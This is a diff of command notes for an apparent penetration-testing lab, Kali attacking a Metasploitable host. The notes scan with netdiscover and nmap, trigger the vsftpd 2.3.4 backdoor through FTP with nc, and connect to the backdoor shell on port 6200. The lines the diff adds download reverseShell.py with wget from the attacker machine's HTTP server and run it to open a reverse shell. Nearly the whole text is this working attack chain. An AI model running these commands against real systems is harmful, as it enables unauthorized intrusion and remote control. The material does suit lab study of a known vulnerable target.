@@ -1,15 +1,17 @@
 kali-CMD sudo netdiscover          #Find the IPs on the network PREP
+ali-CMD nmap -sV 192.168.1.100    #View the ports being used and the version of each application PREP
+kali-CMD2 python3 ~/Desktop/shell/shellServer.py  #This opens the shellServer.py file where it is located and looks for a connection DURING
 
-kali-CMD nmap -sV 192.168.1.100    #View the ports being used and the version of each application PREP
+kali-CMD3 cd ~/Desktop/shell            #Starts the server the will serve the reverseShell.py on the Metasploitable server
+          python3 -m http.server 8080
 
-kali-CMD nc 192.168.1.100 21       #Connects Kali system to port 21 (FTP) and on this vsftp 2.3.4 it opens a backdoor on port 6200 DURING
+kali-CMD4 nc 192.168.1.100 21       #Connects Kali system to port 21 (FTP) and on this vsftp 2.3.4 it opens a backdoor on port 6200 DURING
     user Hacker:)
     pass invalid
 
-kali-CMD2  nc 192.168.1.100 6200   #Connecting into the backdoor DURING
+kali-CMD5  nc 192.168.1.100 6200   #Connecting into the backdoor DURING
+           mkdir shell                                #Make the directory if needed
+           cd shell                                   #Connect into the directory that the reverseShell.py is located
+           wget 192.168.1.101:8080/reverseShell.py    #Starts the reverse shell on the external machine 192.168.1.100
 
-kali-CMD3 python3 ~/Desktop/shell/shellServer.py  #This opens the shellServer.py file where it is located and looks for a connection DURING
-
-
-
-
+           python reverseShell.py 192.168.1.101 &     #It will now connect to the server
